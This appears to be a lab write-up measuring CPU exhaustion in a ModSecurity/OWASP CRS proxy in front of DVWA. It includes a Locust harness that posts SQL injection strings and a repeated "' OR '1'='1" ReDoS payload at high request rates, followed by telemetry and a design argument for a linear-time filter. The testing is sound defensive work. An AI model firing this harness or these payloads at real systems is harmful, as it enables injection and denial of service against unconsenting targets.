
---

## 1. The Objective
The goal of this phase was to measure the true computational cost of ModSecurity's regex-heavy architecture. Specifically, I wanted to prove that relying on sequential PCRE evaluation creates a structural vulnerability to CPU starvation attacks, commonly known as Regular Expression Denial of Service (ReDoS).

## 2. The Methodology
To simulate a realistic, distributed attack, I deployed a Locust load-testing swarm against the proxy. The swarm ramped up to 100 concurrent users, sustaining a rate of 100 requests per second. 

Mixed into the standard traffic was a pathological payload designed specifically to force catastrophic backtracking in the OWASP CRS regex engines:
`admin' OR '1'='1' OR '1'='1... [Repeated x300]`

*The Locust test harness used to generate the asymmetric workloads:*

```python
from bs4 import BeautifulSoup
from locust import HttpUser, task, between

class ModSecStressTest(HttpUser):
    wait_time = between(0.1, 0.5)

    headers = {
        "sec-ch-ua": '"Not-A.Brand";v="24", "Chromium";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
    }

    def get_csrf_token(self):
        res_get = self.client.get("/login.php", headers=self.headers, name="GET /login.php")
        if res_get.status_code == 200:
            soup = BeautifulSoup(res_get.text, 'html.parser')
            token_input = soup.find('input', {'name': 'user_token'})
            if token_input:
                return token_input['value']
        return ""

    @task(3)
    def benign_traffic(self):
        token = self.get_csrf_token()
        data = {"username": "admin", "password": "password", "Login": "Login", "user_token": token}
        self.client.post("/login.php", headers=self.headers, data=data, name="POST Benign")

    @task(1)
    def standard_malicious(self):
        token = self.get_csrf_token()
        data = {"username": "admin' UNION SELECT null, null#", "password": "a", "Login": "Login", "user_token": token}
        self.client.post("/login.php", headers=self.headers, data=data, name="POST Standard SQLi")

    @task(1)
    def cost_stress_redos(self):
        token = self.get_csrf_token()
        payload = "admin" + ("' OR '1'='1" * 300)
        data = {"username": payload, "password": "a", "Login": "Login", "user_token": token}
        self.client.post("/login.php", headers=self.headers, data=data, name="POST ReDoS Stress")
```

## 3. The Telemetry
I captured both latency metrics (via Locust) and system resource utilization (via containerized hardware tracking) at peak load.


![[Pasted image 20260529014213.png]]

* **WAF Proxy (modsec_proxy):** 205.20% CPU utilization
* **Backend Target (dvwa_target):** 41.08% CPU utilization

**Latency Degradation (TTFB):**

| Workload Type | p50 Latency | p99 Latency | Status Code |
| :--- | :--- | :--- | :--- |
| **POST Benign** | 660 ms | 1500 ms | `200 OK` |
| **POST Standard SQLi** | 190 ms | 510 ms | `403 Forbidden` |
| **POST ReDoS Stress** | 200 ms | 580 ms | `403 Forbidden` |

## 4. Architectural Conclusion: The "Short-Circuit" Resource Trap
At first glance, the latency data appears counterintuitive. Both malicious workloads actually resulted in *lower* response times than benign traffic. This occurs because ModSecurity short-circuits the malicious requests, rejecting them at the edge with a `403 Forbidden` before they ever reach the PHP/MySQL backend.

However, cross-referencing that latency with the hardware telemetry exposes a massive asymmetric resource vulnerability. During the ReDoS stress test, the `modsec_proxy` container redlined at over 200% CPU. The PCRE engine burned massive computational cycles executing complex backtracking routines on the ambiguous boundaries of the payload before finally emitting the 403 response. 

This proves a critical architectural flaw: an attacker can completely exhaust the proxy's CPU pool using lightweight, fast-failing payloads. Legitimate connections at the perimeter are starved and dropped, while the upstream application sits perfectly healthy and idle at 41% capacity.

## 5. Requirements for the Custom C Engine
To eliminate this asymmetry, the custom C proxy must decouple payload validation from sequential regex engines. By routing inputs through an $O(n)$ Weighted Aho-Corasick pre-filter and a deterministic tokenization state machine, the computational cost of generating an edge rejection remains strictly linear. This mathematically guarantees that the proxy's CPU cannot be weaponized against itself, regardless of payload complexity.